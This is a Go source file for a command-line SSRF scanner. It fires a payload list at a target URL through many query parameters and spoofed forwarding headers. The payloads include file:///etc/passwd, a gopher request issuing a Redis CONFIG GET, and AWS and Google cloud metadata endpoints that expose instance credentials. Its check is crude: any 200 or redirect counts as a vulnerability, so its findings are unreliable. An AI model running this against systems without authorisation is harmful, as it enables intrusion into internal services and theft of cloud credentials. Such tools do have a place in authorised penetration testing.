package main

import (
    "fmt"
    "net/http"
    "sync"
    "encoding/json"
    "strings"
    "time"
    "os"
    "net/url"
)

type SSRFResult struct {
    URL         string   `json:"url"`
    Vulnerable  bool     `json:"vulnerable"`
    Payload     string   `json:"payload"`
    CallbackURL string   `json:"callback_url,omitempty"`
    Evidence    []string `json:"evidence,omitempty"`
}

var payloads = []string{
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stats",
    "gopher://127.0.0.1:6379/_CONFIG%20GET%20*",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.1:1337",
    "http://127.0.0.1.nip.io",
    "http://127.0.0.1.xip.io",
}

func checkSSRF(target string, payload string, wg *sync.WaitGroup, results chan<- SSRFResult) {
    defer wg.Done()

    client := &http.Client{
        Timeout: time.Second * 10,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }

    // Try different injection points
    params := []string{"url", "path", "dest", "redirect", "uri", "path", "continue", "window", "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return", "page", "feed", "host", "port", "to", "out", "view", "dir"}

    for _, param := range params {
        testURL := fmt.Sprintf("%s?%s=%s", target, param, url.QueryEscape(payload))
        
        req, err := http.NewRequest("GET", testURL, nil)
        if err != nil {
            continue
        }

        // Add headers that might be used for SSRF
        req.Header.Set("X-Forwarded-For", payload)
        req.Header.Set("X-Forwarded-Host", payload)
        req.Header.Set("X-Remote-IP", payload)
        req.Header.Set("X-Remote-Addr", payload)
        req.Header.Set("X-Original-URL", payload)
        req.Header.Set("X-Rewrite-URL", payload)
        req.Header.Set("X-HTTP-Host-Override", payload)
        req.Header.Set("Forwarded", "for="+payload)

        resp, err := client.Do(req)
        if err != nil {
            continue
        }
        defer resp.Body.Close()

        // Check for successful SSRF indicators
        if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 {
            evidence := []string{
                fmt.Sprintf("Status Code: %d", resp.StatusCode),
                fmt.Sprintf("Response Headers: %v", resp.Header),
            }

            results <- SSRFResult{
                URL:        testURL,
                Vulnerable: true,
                Payload:    payload,
                Evidence:   evidence,
            }
            return
        }
    }
}

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: ssrf_scanner <url>")
        os.Exit(1)
    }

    target := os.Args[1]
    results := make(chan SSRFResult, 100)
    var wg sync.WaitGroup

    for _, payload := range payloads {
        wg.Add(1)
        go checkSSRF(target, payload, &wg, results)
    }

    go func() {
        wg.Wait()
        close(results)
    }()

    var findings []SSRFResult
    for result := range results {
        findings = append(findings, result)
    }

    output := struct {
        Target     string       `json:"target"`
        Timestamp  string       `json:"timestamp"`
        Findings   []SSRFResult `json:"findings"`
    }{
        Target:    target,
        Timestamp: time.Now().Format(time.RFC3339),
        Findings:  findings,
    }

    jsonOutput, _ := json.MarshalIndent(output, "", "  ")
    fmt.Println(string(jsonOutput))
} 